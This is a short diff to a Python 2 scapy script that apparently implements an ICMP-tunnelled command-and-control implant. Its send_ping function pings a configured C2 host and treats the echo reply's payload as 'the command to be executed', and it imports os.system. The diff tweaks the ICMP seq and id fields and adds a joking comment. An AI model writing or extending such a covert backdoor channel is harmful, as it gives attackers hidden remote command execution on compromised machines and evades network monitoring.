@@ -1,4 +1,5 @@
 #!/usr/bin/python2
+# Dear future self: You used to suck at code. You probably still do.
 
 from scapy.all import *
 from os import system
@@ -12,7 +13,7 @@ def send_ping(payload):
     ''' Send the call back ping. Response payload is the command to be executed '''
     # Set up the packet with IP and ICMP headers, plus custom payload
     packet_ip = IP(dst=c2_config.c2)
-    packet_icmp = ICMP(type=8)
+    packet_icmp = ICMP(type=8,seq=0x0001,id=0x0831)
     echo_reply = sr1(packet_ip/packet_icmp/payload)
     # Strips the response payload from echo reply packet
     return echo_reply[ICMP][Raw].load
